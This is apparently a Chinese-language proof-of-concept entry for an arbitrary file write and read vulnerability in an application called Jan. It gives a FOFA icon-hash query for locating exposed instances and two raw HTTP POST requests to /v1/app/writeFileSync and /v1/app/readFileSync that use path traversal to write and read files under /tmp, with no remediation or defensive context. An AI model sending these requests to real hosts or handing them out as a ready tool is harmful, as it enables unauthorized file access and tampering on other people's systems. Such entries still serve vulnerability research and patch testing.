## Jan任意文件上传漏洞

## fofa
```
icon_hash="-165268926"
```


## poc
```
POST /v1/app/writeFileSync HTTP/1.1
Host: {{Host}}
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Referer: http://<IP>:<Port>
contentType: application/json
Content-Type: text/plain;charset=UTF-8
Content-Length: 35
Origin: http://<IP>:<Port>
Connection: close

["/../../../../../tmp/a.txt","abc"]


POST /v1/app/readFileSync HTTP/1.1
Host: {{Host}}
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Referer: http://<IP>:<Port>
contentType: application/json
Content-Type: text/plain;charset=UTF-8
Content-Length: 48
Origin: http://<IP>:<Port>
Connection: close

["file:/../../../../../tmp/a.txt","utf-8"]
```
![image](https://github.com/wy876/POC/assets/139549762/0558b716-4096-4789-a8cb-2bcebab4a009)

![image](https://github.com/wy876/POC/assets/139549762/a6bb5774-5e79-4b2a-86a7-e2a60b333fa9)


